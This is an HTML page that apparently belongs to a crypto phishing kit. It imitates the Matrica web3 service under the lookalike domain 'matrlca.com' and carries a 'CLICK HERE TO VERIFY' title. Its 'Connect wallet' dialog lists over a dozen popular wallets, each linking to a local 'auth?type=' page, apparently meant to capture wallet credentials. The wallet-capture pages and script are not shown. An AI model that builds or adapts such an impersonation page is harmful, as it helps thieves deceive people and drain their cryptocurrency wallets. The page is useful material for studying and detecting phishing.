<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Matrica connects web3 identities + marketplaces + blockchain tools + social communities. Connect nft. All the web3 tools you need in one place.">
  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://matrlca.com/">
  <meta property="og:title" content="CLICK HERE TO VERIFY">
  <meta property="og:description" content="Matrica connects web3 identities + marketplaces + blockchain tools + social communities. Connect nft. All the web3 tools you need in one place.">
  <meta property="og:image" content="https://matrlca.com/assets/images/banner_front.jpg">
  <!-- Twitter -->
  <meta property="twitter:card" content="summary_large_image">
  <meta property="twitter:url" content="https://matrlca.com/">
  <meta property="twitter:title" content="CLICK HERE TO VERIFY">
  <meta property="twitter:description" content="Matrica connects web3 identities + marketplaces + blockchain tools + social communities. Connect nft. All the web3 tools you need in one place.">
  <meta property="twitter:image" content="https://matrlca.com/assets/images/banner_front.jpg">

  <title>CLICK HERE TO VERIFY</title>

  <!-- Favicon -->
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

  <!-- Fonts -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" />


  <link rel="stylesheet" href="assets/vendor/bootstrap.min.css">
  <link rel="stylesheet" href="assets/vendor/fontawesome.css">
  <link rel="stylesheet" href="assets/css/main.css">
</head>

<body>
  <!-- Header section -->
  <div class="container-fluid border-bottom fixed-top" id="header-wrapper">
    <header class="d-flex align-items-center justify-content-around justify-content-md-around py-3 header">
      <div class="d-flex align-items-center col-md-2 mb-2 mb-md-0 text-dark text-decoration-none mr-5 header-icons">
        <a class="me-3">
          <img src="assets/images/menu-icon-white.svg" alt="" height="15px">
        </a>
        <a href="/" class="">
          <img src="assets/images/logo-white.svg" alt="" height="25px">
        </a>
      </div>

      <form class="w-75">
        <div class="input-group">
          <span class="input-group-text" id="search-icon"><i class="fas fa-search"></i></span>
          <input type="search" class="form-control search-icon py-3" placeholder="Search users, wallets, or collections" aria-label="Search" aria-describedby="search-icon">
        </div>
      </form>

      <div class="col-md-2 d-none d-md-flex justify-content-end">
        <svg height="25px" focusable=" false" aria-hidden="true" viewBox="0 0 24 24">
          <path fill="#ffffff" d="M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69zM12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6zm0-10c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4z"></path>
        </svg>
      </div>
    </header>
  </div>

  <section class="login">
    <div class="login-box">
      <h2>Connect</h2>
      <p>Connect with a Solana wallet</p>
      <button class="btn-default" data-bs-toggle="modal" data-bs-target="#selectWalletModal">Connect wallet</button>
    </div>

    <!-- Modal -->
    <div class="modal fade" id="selectWalletModal" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-sm">
        <div class="modal-content" id="selectWalletModalContent">
          <h5 class="text-center">Choose Wallet</h5>
          <div class="modal-body">
            <div class="wallet-list">
              <a href="auth?type=Phantom" class="wallet">
                <img src="assets/images/phantom.svg" alt="" class="wallet-icon">
                <p class="wallet-name">Phantom</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Slope" class="wallet">
                <img src="assets/images/slope.svg" alt="" class="wallet-icon">
                <p class="wallet-name">Slope</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Solflare" class="wallet">
                <img src="assets/images/solflare.svg" alt="" class="wallet-icon">
                <p class="wallet-name">Solflare</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="Torus" class="wallet">
                <img src="assets/images/torus.svg" alt="" class="wallet-icon">
                <p class="wallet-name">Torus</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Sollet" class="wallet">
                <img src="assets/images/sollet.svg" alt="" class="wallet-icon">
                <p class="wallet-name">Sollet</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Coinbase" class="wallet">
                <img src="assets/images/coinbase.png" alt="" class="wallet-icon">
                <p class="wallet-name">Coinbase</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Sollet Extension" class="wallet">
                <img src="assets/images/sollet_extension.png" alt="" class="wallet-icon">
                <p class="wallet-name">Sollet Extension</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Ledger" class="wallet">
                <img src="assets/images/ledger.png" alt="" class="wallet-icon bg-light">
                <p class="wallet-name">Ledger</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Metamask" class="wallet">
                <img src="assets/images/metamask.png" alt="" class="wallet-icon">
                <p class="wallet-name">Metamask</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=WalletConnect" class="wallet">
                <img src="assets/images/walletconnect.svg" alt="" class="wallet-icon">
                <p class="wallet-name">WalletConnect</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Trust Wallet" class="wallet">
                <img src="assets/images/trustwallet.png" alt="" class="wallet-icon bg-light">
                <p class="wallet-name">Trust Wallet</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Token Pocket" class="wallet">
                <img src="assets/images/tokenpocket.png" alt="" class="wallet-icon">
                <p class="wallet-name">Token Pocket</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=SafePal" class="wallet">
                <img src="assets/images/safepal.png" alt="" class="wallet-icon">
                <p class="wallet-name">SafePal</p>
              </a>
            </div>

            <div class="wallet-list">
              <a href="auth?type=Other" class="wallet">
                <img src="assets/images/otherwallet.png" alt="" class="wallet-icon">
                <p class="wallet-name">Other Wallets</p>
              </a>
            </div>

          </div>
        </div>
      </div>
    </div>
  </section>

  <script src="assets/vendor/jquery.js"></script>
  <script src="assets/vendor/bootstrap.min.js"></script>
  <script src="assets/vendor/fontawesome.js"></script>
  <script src="assets/js/main.js"></script>
</body>

</html>